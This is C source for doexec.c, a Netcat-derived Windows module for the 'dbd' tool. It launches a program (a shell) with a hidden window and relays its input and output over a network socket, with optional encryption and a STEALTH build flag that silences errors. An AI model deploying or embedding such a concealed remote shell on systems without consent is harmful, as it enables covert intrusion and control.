/*
    doexec.c was derived from the Win32 port of Netcat and has been slightly
    modified for dbd (2 potentially harmful buffer overflows and a memory leak
    has been resolved in the process).

    The original version of Netcat was written by *hobbit* <hobbit@avian.org>
    The NT version was done by Weld Pond <weld@l0pht.com>
*/

// portions Copyright (C) 1994 Nathaniel W. Mishkin
// code taken from rlogind.exe

#include <io.h>
#include <stdio.h> 
#include <stdlib.h>
#include <winsock.h>
#include <winbase.h>

#include "pel.h"

#define BUFFER_SIZE BUFSIZE

extern char *program_to_execute;
extern int use_encryption;
extern int quiet;
extern int convert_to_crlf;

#ifndef WINMAIN
extern int snooping;
extern int highlight_incoming;
extern char highlight_prefix[];
extern char highlight_suffix[];
#endif

#ifdef WINMAIN
    #ifndef STEALTH
        extern void errbox(char *msg);
        void displayAmbitiousErrbox(char *prefix, DWORD err);
    #endif
#endif

char smbuff[20];

//
// Structure used to describe each session
//
typedef struct {

    //
    // These fields are filled in at session creation time
    //
    HANDLE  ReadPipeHandle;         // Handle to shell stdout pipe
    HANDLE  WritePipeHandle;        // Handle to shell stdin pipe
    HANDLE  ProcessHandle;          // Handle to shell process

    //
    //
    // These fields are filled in at session connect time and are only
    // valid when the session is connected
    //
    SOCKET  ClientSocket;
    HANDLE  ReadShellThreadHandle;  // Handle to session shell-read thread
    HANDLE  WriteShellThreadHandle; // Handle to session shell-read thread

    int QuitAllThreads;

} SESSION_DATA, *PSESSION_DATA;


//
// Private prototypes
//

static HANDLE
StartShell(
    HANDLE StdinPipeHandle,
    HANDLE StdoutPipeHandle
    );

static VOID
SessionReadShellThreadFn(
    LPVOID Parameter
    );

static VOID
SessionWriteShellThreadFn(
    LPVOID Parameter
    );



// **********************************************************************
//
// CreateSession
//
// Creates a new session. Involves creating the shell process and establishing
// pipes for communication with it.
//
// Returns a handle to the session or NULL on failure.
//

static PSESSION_DATA
CreateSession(
    VOID
    )
{
    PSESSION_DATA Session = NULL;
    BOOL Result;
    SECURITY_ATTRIBUTES SecurityAttributes;
    HANDLE ShellStdinPipe = NULL;
    HANDLE ShellStdoutPipe = NULL;

    //
    // Allocate space for the session data
    //
    Session = (PSESSION_DATA) malloc(sizeof(SESSION_DATA));
    if (Session == NULL) {
        return(NULL);
    }

    //
    // Reset fields in preparation for failure
    //
    Session->ReadPipeHandle  = NULL;
    Session->WritePipeHandle = NULL;

    /* QuitAllThreads is how we sync between threads
       -- <michel.blomgren@tigerteam.se> */
    Session->QuitAllThreads = 0;


    //
    // Create the I/O pipes for the shell
    //
    SecurityAttributes.nLength = sizeof(SecurityAttributes);
    SecurityAttributes.lpSecurityDescriptor = NULL; // Use default ACL
    SecurityAttributes.bInheritHandle = TRUE; // Shell will inherit handles

    Result = CreatePipe(&Session->ReadPipeHandle, &ShellStdoutPipe,
                          &SecurityAttributes, 0);
    if (!Result) {
        #ifndef WINMAIN
        if (!quiet)
                fprintf(stderr, "failed to create shell stdout pipe (net helpmsg %s)\n", itoa(GetLastError(), smbuff, 10));
        #else
            #ifndef STEALTH
            if (!quiet)
                displayAmbitiousErrbox("failed to create shell stdout pipe!\n", GetLastError());
            #endif
        #endif
        goto Failure;
    }
    Result = CreatePipe(&ShellStdinPipe, &Session->WritePipeHandle,
                        &SecurityAttributes, 0);

    if (!Result) {
        #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "failed to create shell stdin pipe (net helpmsg %s)\n", itoa(GetLastError(), smbuff, 10));
        #else
            #ifndef STEALTH
            if (!quiet)
                displayAmbitiousErrbox("failed to create shell stdin pipe!\n", GetLastError());
            #endif
        #endif
        goto Failure;
    }
    //
    // Start the shell
    //
    Session->ProcessHandle = StartShell(ShellStdinPipe, ShellStdoutPipe);

    //
    // We're finished with our copy of the shell pipe handles
    // Closing the runtime handles will close the pipe handles for us.
    //
    CloseHandle(ShellStdinPipe);
    CloseHandle(ShellStdoutPipe);

    //
    // Check result of shell start
    //
    if (Session->ProcessHandle == NULL) {
        goto Failure;
    }

    //
    // The session is not connected, initialize variables to indicate that
    //
    Session->ClientSocket = INVALID_SOCKET;

    //
    // Success, return the session pointer as a handle
    //
    return(Session);

Failure:

    //
    // We get here for any failure case.
    // Free up any resources and exit
    //

    if (ShellStdinPipe != NULL) 
        CloseHandle(ShellStdinPipe);
    if (ShellStdoutPipe != NULL) 
        CloseHandle(ShellStdoutPipe);
    if (Session->ReadPipeHandle != NULL) 
        CloseHandle(Session->ReadPipeHandle);
    if (Session->WritePipeHandle != NULL) 
        CloseHandle(Session->WritePipeHandle);

    free(Session);

    return(NULL);
}



BOOL
doexec(
    SOCKET  ClientSocket
    )
{
    PSESSION_DATA   Session = CreateSession();
    SECURITY_ATTRIBUTES SecurityAttributes;
    DWORD ThreadId;
    HANDLE HandleArray[3];
	int i;

    if (!program_to_execute) {
        #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "no program to execute\n");
        #else
            #ifndef STEALTH
            if (!quiet)
                errbox("no program to execute!");
            #endif
        #endif
        return FALSE;
    }

    SecurityAttributes.nLength = sizeof(SecurityAttributes);
    SecurityAttributes.lpSecurityDescriptor = NULL; // Use default ACL
    SecurityAttributes.bInheritHandle = FALSE; // No inheritance

    //
    // Store the client socket handle in the session structure so the thread
    // can get at it. This also signals that the session is connected.
    //
    Session->ClientSocket = ClientSocket;

    //
    // Create the session threads
    //
    Session->ReadShellThreadHandle = 
        CreateThread(&SecurityAttributes, 0,
                     (LPTHREAD_START_ROUTINE) SessionReadShellThreadFn, 
                     (LPVOID) Session, 0, &ThreadId);

    if (Session->ReadShellThreadHandle == NULL) {
        #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "failed to create ReadShell session thread (net helpmsg %s)\n", itoa(GetLastError(), smbuff, 10));
        #else
            #ifndef STEALTH
            if (!quiet)
                displayAmbitiousErrbox("failed to create ReadShell session thread!\n", GetLastError());
            #endif
        #endif
        //
        // Reset the client pipe handle to indicate this session is disconnected
        //
        Session->ClientSocket = INVALID_SOCKET;
        return(FALSE);
    }

    Session->WriteShellThreadHandle = 
        CreateThread(&SecurityAttributes, 0, 
                     (LPTHREAD_START_ROUTINE) SessionWriteShellThreadFn, 
                     (LPVOID) Session, 0, &ThreadId);

    if (Session->WriteShellThreadHandle == NULL) {
        #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "failed to create ReadShell session thread (net helpmsg %s)\n", itoa(GetLastError(), smbuff, 10));
        #else
            #ifndef STEALTH
            if (!quiet)
                displayAmbitiousErrbox("failed to create ReadShell session thread!\n", GetLastError());
            #endif
        #endif
        //
        // Reset the client pipe handle to indicate this session is disconnected
        //
        Session->ClientSocket = INVALID_SOCKET;

//        TerminateThread(Session->WriteShellThreadHandle, 0);
        Session->QuitAllThreads = 1;
        return(FALSE);
    }

    //
    // Wait for either thread or the shell process to finish
    //

    HandleArray[0] = Session->ReadShellThreadHandle;
    HandleArray[1] = Session->WriteShellThreadHandle;
    HandleArray[2] = Session->ProcessHandle;

    i = WaitForMultipleObjects(3, HandleArray, FALSE, INFINITE);

	switch (i) {
      case WAIT_OBJECT_0 + 0:
//        TerminateThread(Session->WriteShellThreadHandle, 0);
        TerminateProcess(Session->ProcessHandle, 1);
        break;

      case WAIT_OBJECT_0 + 1:
//        TerminateThread(Session->ReadShellThreadHandle, 0);
        TerminateProcess(Session->ProcessHandle, 1);
        break;
      case WAIT_OBJECT_0 + 2:
//        TerminateThread(Session->WriteShellThreadHandle, 0);
//        TerminateThread(Session->ReadShellThreadHandle, 0);
        break;
 
      default:
        #ifndef WINMAIN
        if (!quiet)
            fprintf(stderr, "WaitForMultipleObjects error (net helpmsg %s)\n", itoa(GetLastError(), smbuff, 10));
        #else
            #ifndef STEALTH
            if (!quiet)
                displayAmbitiousErrbox("WaitForMultipleObjects error!\n", GetLastError());
            #endif
        #endif
        break;
    }

    Session->QuitAllThreads = 1;

    /* give the threads some time to exit */
    Sleep(100);


    // Close my handles to the threads, the shell process, and the shell pipes
  	closesocket(Session->ClientSocket);

	
	DisconnectNamedPipe(Session->ReadPipeHandle);
    CloseHandle(Session->ReadPipeHandle);

	DisconnectNamedPipe(Session->WritePipeHandle);
    CloseHandle(Session->WritePipeHandle);


    CloseHandle(Session->ReadShellThreadHandle);
    CloseHandle(Session->WriteShellThreadHandle);

    CloseHandle(Session->ProcessHandle);
 
    free(Session);

    return(TRUE);
}


// **********************************************************************
//
// StartShell
//
// Execs the shell with the specified handle as stdin, stdout/err
//
// Returns process handle or NULL on failure
//

static HANDLE
StartShell(
    HANDLE ShellStdinPipeHandle,
    HANDLE ShellStdoutPipeHandle
    )
{
    PROCESS_INFORMATION ProcessInformation;
    STARTUPINFO si;
    HANDLE ProcessHandle = NULL;

    ZeroMemory( &si, sizeof(STARTUPINFO) );

    //
    // Initialize process startup info
    //
    si.cb = sizeof(STARTUPINFO);
    si.lpReserved = NULL;
    si.lpTitle = NULL;
    si.lpDesktop = NULL;
    si.dwX = si.dwY = si.dwXSize = si.dwYSize = 0L;
    si.wShowWindow = SW_HIDE;
    si.lpReserved2 = NULL;
    si.cbReserved2 = 0;

    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    si.hStdInput  = ShellStdinPipeHandle;
    si.hStdOutput = ShellStdoutPipeHandle;

    DuplicateHandle(GetCurrentProcess(), ShellStdoutPipeHandle, 
                    GetCurrentProcess(), &si.hStdError,
                    DUPLICATE_SAME_ACCESS, TRUE, 0);

    if (CreateProcess(NULL, program_to_execute, NULL, NULL, TRUE, 0, NULL, NULL,
                      &si, &ProcessInformation)) {
        ProcessHandle = ProcessInformation.hProcess;
        CloseHandle(ProcessInformation.hThread);
    } else {
        #ifndef WINMAIN
        if (!quiet)
            fprintf(stderr, "failed to execute shell (net helpmsg %s)\n", itoa(GetLastError(), smbuff, 10));
        #else
            #ifndef STEALTH
            if (!quiet)
                displayAmbitiousErrbox("failed to execute shell!\n", GetLastError());
            #endif
        #endif
    }

    return(ProcessHandle);
}


// **********************************************************************
// SessionReadShellThreadFn
//
// The read thread procedure. Reads from the pipe connected to the shell
// process, writes to the socket.
//

static VOID
SessionReadShellThreadFn(
    LPVOID Parameter
    )
{
    PSESSION_DATA Session = Parameter;
    BYTE    Buffer[BUFFER_SIZE / 2];
    BYTE    Buffer2[BUFFER_SIZE];
    DWORD   BytesRead;


	// this bogus peek is here because win32 won't let me close the pipe if it is
	// in waiting for input on a read.
    while (PeekNamedPipe(Session->ReadPipeHandle, Buffer, sizeof(Buffer),
                    &BytesRead, NULL, NULL))
    {
            DWORD BufferCnt, BytesToWrite;
            BYTE PrevChar = 0;


        if (Session->QuitAllThreads) {
            ExitThread(0);
        }

		if (BytesRead > 0) {
			ReadFile(Session->ReadPipeHandle, Buffer, sizeof(Buffer), 
                    &BytesRead, NULL);
		} else {
                    Sleep(20);
                    continue;
		}

        //
        // Process the data we got from the shell:  replace any naked LF's
        // with CR-LF pairs.
        //
        for (BufferCnt = 0, BytesToWrite = 0; BufferCnt < BytesRead; BufferCnt++) {
            if (Buffer[BufferCnt] == '\n' && PrevChar != '\r')
                Buffer2[BytesToWrite++] = '\r';
            PrevChar = Buffer2[BytesToWrite++] = Buffer[BufferCnt];
        }

        #ifndef WINMAIN
        if (snooping) {
            write(STDOUT_FILENO, Buffer2, BytesToWrite);
        }
        #endif
        if (use_encryption) {
            if (pel_send_msg(Session->ClientSocket, Buffer2, BytesToWrite) != PEL_SUCCESS) {
                #ifdef DEBUG
                    #ifndef WINMAIN
                        fprintf(stderr, "pel_send_msg failed\n");
                    #else
                        errbox("pel_send_msg failed!");
                    #endif
                #endif
                break;
            }
        } else {
            if (send(Session->ClientSocket, Buffer2, BytesToWrite, 0) <= 0)
                break;
        }

    }

    if ((GetLastError() != ERROR_BROKEN_PIPE)) {
        #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "SessionReadShellThreadFn exitted (net helpmsg %s)\n", itoa(GetLastError(), smbuff, 10));
        #else
            #ifndef STEALTH
            if (!quiet)
                displayAmbitiousErrbox("SessionReadShellThreadFn exitted!\n", GetLastError());
            #endif
        #endif
    }

	ExitThread(0);
}


// **********************************************************************
// SessionWriteShellThreadFn
//
// The write thread procedure. Reads from socket, writes to pipe connected
// to shell process.  


static VOID
SessionWriteShellThreadFn(
    LPVOID Parameter
    )
{
    PSESSION_DATA Session = Parameter;
    BYTE    Buffer[BUFFER_SIZE];
    BYTE    secondary_buffer[BUFFER_SIZE * 2];
    DWORD   BytesWritten;
//    BYTE    RecvBuffer[1];
//    BYTE    EchoBuffer[5];
//    DWORD   BufferCnt, EchoCnt;

    int previouschar = 0;
    int nextchar;

    /* the original code has been modified, replaced with the code below
       -- (C) 2004 Michel Blomgren <michel.blomgren@tigerteam.se> */
    while (1) {
        fd_set fds;
        struct timeval tv;

        FD_ZERO(&fds);
        FD_SET(Session->ClientSocket, &fds);

        tv.tv_sec = 0;
        tv.tv_usec = 50;

        if (Session->QuitAllThreads) {
            break;
        }

        if (select(FD_SETSIZE, &fds, NULL, NULL, &tv) != SOCKET_ERROR) {
            int i, x;
            int cnt;

            if (FD_ISSET(Session->ClientSocket, &fds)) {
                if (use_encryption) {
                    cnt = sizeof(Buffer);
                    if (pel_recv_msg(Session->ClientSocket, Buffer, &cnt) != PEL_SUCCESS) {
                        break;
                    }
                    if (cnt == 0) {
                        break;
                    }
                } else {
                    if ((cnt = recv(Session->ClientSocket, Buffer, sizeof(Buffer), 0)) == SOCKET_ERROR) {
                        break;
                    }
                    if (cnt == 0) {
                        break;
                    }
                }

                if (convert_to_crlf) {
                    /* convert any bare LF to CR+LF, and any bare CR to CR+LF */
                    /* warning: secondary_buffer must be * 2 to avoid bof */
                    /* code is (C) 2004 Michel Blomgren <michel.blomgren@tigerteam.se> */
                    for (i = 0, x = 0; i < cnt; i++) {
                        if (i < (cnt-1)) {
                            nextchar = Buffer[i+1];
                        } else {
                            nextchar = 0;
                        }
                        if ((Buffer[i] == '\n') && (previouschar != '\r')) {
                            secondary_buffer[x++] = '\r';
                            secondary_buffer[x++] = Buffer[i];
                        } else if ((Buffer[i] == '\r') && (nextchar != '\n')) {
                            secondary_buffer[x++] = '\r';
                            secondary_buffer[x++] = '\n';
                        } else {
                            secondary_buffer[x++] = Buffer[i];
                        }
                        previouschar = Buffer[i];
                    }
                    secondary_buffer[x++] = 0;
                    cnt = strlen(secondary_buffer);
                    /* end LF/CR conversion */
                } else {
                    for (i = 0, x = 0; i < cnt; i++) {
                        secondary_buffer[x++] = Buffer[i];
                    }
                    secondary_buffer[x++] = 0;
                }

                if (Session->QuitAllThreads) {
                    break;
                }

                #ifndef WINMAIN
                if (snooping) {
                    if (highlight_incoming) {
                        write(STDOUT_FILENO, highlight_prefix, strlen(highlight_prefix));
                        write(STDOUT_FILENO, secondary_buffer, cnt);
                        write(STDOUT_FILENO, highlight_suffix, strlen(highlight_suffix));
                    } else {
                        write(STDOUT_FILENO, secondary_buffer, cnt);
                    }
                }
                #endif
                if (! WriteFile(Session->WritePipeHandle, secondary_buffer, cnt, &BytesWritten, NULL)) {
                    break;
                }
            }
        } else {
            break;
        }

    }

/* original code (vuln to a bof):
    //
    // Loop, reading one byte at a time from the socket.    
    //
    while (recv(Session->ClientSocket, RecvBuffer, sizeof(RecvBuffer), 0) != 0) {
        EchoCnt = 0;

        Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = RecvBuffer[0];
        if (RecvBuffer[0] == '\r')
                Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = '\n';


		// Trap exit as it causes problems
		if (strnicmp(Buffer, "exit\r\n", 6) == 0)
			ExitThread(0);

        //
        // If we got a CR, it's time to send what we've buffered up down to the
        // shell process.
        //
        if (RecvBuffer[0] == '\n' || RecvBuffer[0] == '\r') {
            if (! WriteFile(Session->WritePipeHandle, Buffer, BufferCnt, 
                            &BytesWritten, NULL))
            {
                break;
            }
            BufferCnt = 0;
        }
    }
*/

	ExitThread(0);
}
